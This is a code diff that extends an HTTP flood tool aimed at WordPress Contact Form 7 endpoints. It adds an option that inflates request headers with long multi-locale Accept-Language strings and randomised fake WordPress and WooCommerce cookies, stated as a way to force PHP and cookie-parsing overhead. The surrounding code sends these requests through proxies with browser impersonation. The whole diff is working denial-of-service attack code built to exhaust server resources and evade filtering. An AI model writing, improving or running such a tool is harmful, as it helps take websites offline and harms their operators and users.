@@ -146,7 +146,57 @@ FIXED_PROFILE = None
 # differently under flood than the always-uncached CF7 POST.
 HOMEPAGE_MODE = False
 
-LARGE_PAYLOAD = False
+LARGE_PAYLOAD    = False
+INFLATE_HEADERS  = False
+
+_ACCEPT_LANGS = [
+    "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,de-DE;q=0.6,de;q=0.5,es-ES;q=0.4,es;q=0.3,"
+    "it-IT;q=0.25,it;q=0.2,pt-BR;q=0.18,pt;q=0.15,ja;q=0.12,zh-CN;q=0.1,zh;q=0.08,"
+    "ko;q=0.06,ru;q=0.05,ar;q=0.04,hi;q=0.03,nl;q=0.02,pl;q=0.01",
+    "en-GB,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,it;q=0.5,pt;q=0.4,nl;q=0.3,"
+    "sv;q=0.25,no;q=0.2,da;q=0.18,fi;q=0.15,pl;q=0.12,cs;q=0.1,hu;q=0.08,"
+    "ro;q=0.06,tr;q=0.05,el;q=0.04,he;q=0.03,uk;q=0.02,sk;q=0.01",
+    "en-AU,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6,ko;q=0.5,id;q=0.4,ms;q=0.3,"
+    "th;q=0.25,vi;q=0.2,tl;q=0.18,fr;q=0.15,de;q=0.12,es;q=0.1,it;q=0.08,"
+    "pt;q=0.06,ru;q=0.05,ar;q=0.04,hi;q=0.03,tr;q=0.02,nl;q=0.01",
+]
+
+_WP_COOKIE_KEYS = [
+    "wordpress_logged_in", "wordpress_sec", "wp-settings-1", "wp-settings-time-1",
+    "wp_lang", "woocommerce_cart_hash", "woocommerce_items_in_cart",
+    "woocommerce_session", "wp_woocommerce_session", "wordpress_test_cookie",
+    "gdpr_consent", "cookielawinfo-checkbox-analytics", "cookielawinfo-checkbox-functional",
+    "cookielawinfo-checkbox-necessary", "cookielawinfo-checkbox-performance",
+    "viewed_cookie_policy", "wordpress_gdpr_cookies_allowed",
+]
+
+def _random_cookie_header():
+    keys = random.sample(_WP_COOKIE_KEYS, k=random.randint(8, 12))
+    pairs = [f"{k}={random.randint(10**15, 10**16):016x}" for k in keys]
+    return "; ".join(pairs)
+
+def _extra_headers(domain, ua):
+    return {
+        "Origin":          f"https://{domain}",
+        "Referer":         f"https://{domain}/",
+        "User-Agent":      ua,
+        "Accept":          "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": random.choice(_ACCEPT_LANGS),
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Cookie":          _random_cookie_header(),
+        "Sec-Fetch-Site":  "same-origin",
+        "Sec-Fetch-Mode":  "cors",
+        "Sec-Fetch-Dest":  "empty",
+        "DNT":             "1",
+        "X-Requested-With": "XMLHttpRequest",
+    }
+
+def _base_headers(domain, ua):
+    return {
+        "Origin":     f"https://{domain}",
+        "Referer":    f"https://{domain}/",
+        "User-Agent": ua,
+    }
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -482,10 +532,11 @@ def send_one(req_num, cfg, pool):
 
     t0 = time.time()
     try:
+        hdrs = _extra_headers(domain, ua) if INFLATE_HEADERS else _base_headers(domain, ua)
         if HOMEPAGE_MODE:
             r = cf_requests.get(
                 f"https://{domain}/",
-                headers={"User-Agent": ua},
+                headers=hdrs,
                 proxies={"http": proxy, "https": proxy} if proxy else None,
                 impersonate=impersonate,
                 timeout=25,
@@ -494,7 +545,7 @@ def send_one(req_num, cfg, pool):
             r = cf_requests.post(
                 cfg["url"],
                 multipart=build_multipart(cfg["form_id"], cfg["unit_tag"], large_payload=LARGE_PAYLOAD),
-                headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
+                headers=hdrs,
                 proxies={"http": proxy, "https": proxy} if proxy else None,
                 impersonate=impersonate,
                 timeout=25,
@@ -746,7 +797,11 @@ def main():
                         "flood than the always-uncached CF7 POST.")
     p.add_argument("--large-payload", action="store_true",
                    help="Inflate each request: multi-paragraph message (~3KB) +\n"
-                        "4-8 extra form fields. Increases per-worker CPU time.")
+                        "8-14 extra form fields. Increases per-worker CPU time.")
+    p.add_argument("--inflate-headers", action="store_true",
+                   help="Send fat request headers: 20-locale Accept-Language,\n"
+                        "8-12 fake WP cookies, Sec-Fetch-*, DNT, X-Requested-With.\n"
+                        "Forces PHP $_SERVER + WordPress cookie parsing overhead.")
     p.add_argument("--msg-repeat",   type=int, default=1, metavar="N",
                    help="Repeat the message body N times (separator between each).\n"
                         "N=5 → ~15KB, N=10 → ~30KB per request.\n"
@@ -789,6 +844,10 @@ def main():
     if args.large_payload:
         global LARGE_PAYLOAD
         LARGE_PAYLOAD = True
+
+    if args.inflate_headers:
+        global INFLATE_HEADERS
+        INFLATE_HEADERS = True
 
     if args.msg_repeat > 1:
         global MSG_REPEAT
